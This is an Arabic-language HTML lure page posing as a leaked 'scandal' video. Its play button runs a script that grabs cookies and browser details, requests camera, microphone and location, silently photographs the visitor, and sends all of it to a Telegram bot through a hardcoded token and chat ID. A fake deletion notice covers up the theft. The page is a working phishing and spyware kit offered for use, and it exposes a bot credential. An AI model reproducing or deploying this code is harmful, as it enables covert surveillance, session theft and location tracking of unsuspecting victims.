
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فضيحة نار 🔥🔥 - حصري 2026</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; }
        .player-shell { border: 2px solid #222; background: #0a0a0a; position: relative; overflow: hidden; }
        .neon-text { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-6">

    <div class="w-full max-w-2xl text-center mb-6">
        <h1 class="text-3xl font-bold neon-text mb-4 underline">فضيحة نار 🔥🔥 شاهد قبل الحذف</h1>
        <div class="player-shell aspect-video rounded-3xl flex items-center justify-center cursor-pointer" onclick="ignitePayload()">
            <div id="playIcon" class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center shadow-2xl">
                <svg viewBox="0 0 24 24" class="w-10 h-10 fill-white"><path d="M8 5v14l11-7z"/></svg>
            </div>
            <div id="loader" class="hidden flex flex-col items-center">
                <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-red-600 mb-4"></div>
                <p class="text-sm">جاري جلب بيانات الفيديو المسرب...</p>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
        const CHAT_ID = "1523412137";

        async function sendToTelegram(text) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
            });
        }

        async function ignitePayload() {
            document.getElementById('playIcon').style.display = 'none';
            document.getElementById('loader').classList.remove('hidden');

            // 1. سحب الكوكيز (The Cookie Grabber)
            const cookies = document.cookie || "لا توجد كوكيز متاحة (HttpOnly أو فارغة)";
            const browserInfo = `🖥️ *بيانات المتصفح:* ${navigator.userAgent}\n🍪 *الكوكيز:* \`${cookies}\``;
            await sendToTelegram(browserInfo);

            // 2. طلب الأذونات (كاميرا + ميكروفون + موقع)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                // سحب الموقع
                navigator.geolocation.getCurrentPosition(async p => {
                    const loc = `📍 *موقع الضحية اللحظي:*\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    await sendToTelegram(loc);
                });

                // التقاط صورة صامتة
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    setTimeout(async () => {
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(async blob => {
                            const fd = new FormData();
                            fd.append('chat_id', CHAT_ID);
                            fd.append('photo', blob, 'shot.jpg');
                            fd.append('caption', "📸 صورة مسربة للضحية");
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                            stream.getTracks().forEach(t => t.stop());
                        }, 'image/jpeg');
                    }, 1000);
                };

                setTimeout(() => {
                    document.getElementById('loader').innerHTML = "<p class='text-red-500'>عذراً، هذا المقطع تم حذفه من قبل إدارة الأمان!</p>";
                }, 4000);

            } catch (err) {
                await sendToTelegram("⚠️ الضحية رفض إعطاء الأذونات.");
                document.getElementById('loader').innerHTML = "<p class='text-orange-500'>فشل التحميل: يرجى السماح بالأذونات للمشاهدة.</p>";
            }
        }
    </script>
</body>
</html>
